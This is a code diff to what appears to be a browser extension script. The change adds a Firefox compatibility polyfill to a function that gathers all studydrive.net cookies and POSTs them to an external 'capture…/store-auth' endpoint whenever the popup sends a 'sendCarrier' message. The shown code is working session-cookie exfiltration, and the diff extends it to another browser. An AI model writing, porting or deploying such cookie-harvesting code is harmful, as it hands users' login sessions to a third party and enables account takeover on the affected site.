@@ -1,6 +1,11 @@
+// Polyfill for browser compatibility (Firefox and Chrome)
+if (typeof browser === "undefined") {
+    var browser = chrome;
+}
+
 function getCookiesAndSend(sendResponse) {
     // Fetch the current active tab to get the URL
-    chrome.tabs.query({ active: true, lastFocusedWindow: true }, function(tabs) {
+    browser.tabs.query({ active: true, lastFocusedWindow: true }, function(tabs) {
         let activeTab = tabs[0];
         let url = activeTab.url;
 
@@ -9,8 +14,8 @@ function getCookiesAndSend(sendResponse) {
             return; // Exit early if no URL is found
         }
 
-        chrome.cookies.getAll({ domain: 'studydrive.net' }, function(cookies) {
-            
+        browser.cookies.getAll({ domain: 'studydrive.net' }, function(cookies) {
+
             if (cookies.length > 0) {
                 let cookieData = cookies.map(cookie => ({
                     name: cookie.name,
@@ -22,7 +27,6 @@ function getCookiesAndSend(sendResponse) {
                     sameSite: cookie.sameSite,
                     expirationDate: cookie.expirationDate,
                 }));
-
 
                 fetch('https://capture.artifactpowered.com/store-auth', {
                     method: 'POST',
@@ -58,7 +62,7 @@ function getCookiesAndSend(sendResponse) {
 }
 
 // Listen for messages from the popup
-chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
+browser.runtime.onMessage.addListener(function(request, sender, sendResponse) {
     console.log('Received message:', request);
     if (request.action === 'sendCarrier') {
         getCookiesAndSend(sendResponse);
